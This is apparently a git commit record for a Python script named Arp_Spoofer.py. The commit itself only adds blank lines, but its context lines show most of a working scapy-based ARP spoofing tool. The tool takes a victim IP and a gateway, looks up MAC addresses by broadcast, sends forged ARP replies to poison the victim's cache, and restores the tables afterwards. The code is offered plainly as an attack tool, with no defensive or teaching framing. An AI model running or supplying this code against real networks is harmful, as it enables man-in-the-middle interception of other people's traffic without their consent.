53d3f09ef7fff3298e3f01357206a1c1f2c6bf3a
SecureUniverse <64855572+SecureUniverse@users.noreply.github.com>
2021-10-17 13:00:10 +0330

    Update Arp_Spoofer.py

--- Arp_Spoofer.py
+++ Arp_Spoofer.py
@@ -3,6 +3,7 @@ import scapy.all as scapy
 import time
 import sys
 
+
 def get_arguments():
     parser = optparse.OptionParser()
     parser.add_option("-t", "--target", dest="target", help="Victim`s IP address")
@@ -15,6 +16,7 @@ def get_arguments():
         parser.error("[-] Please specify a gateway, use --help for more info.")
     return options
 
+
 def get_mac(ip):
     arp_request = scapy.ARP(pdst=ip)
     broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
@@ -22,17 +24,20 @@ def get_mac(ip):
     answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
     return answered_list[0][1].hwsrc
 
+
 def spoof(target_ip, spoof_ip):
     target_mac = get_mac(target_ip)
     packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
     scapy.send(packet, verbose=False)
 
+    
 def restore(destination_ip, source_ip):
     destination_mac = get_mac(destination_ip)
     source_mac = get_mac(source_ip)
     packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
     scapy.send(packet, count=4, verbose=False)
 
+    
 if __name__ == '__main__':
     try:
         options = get_arguments()
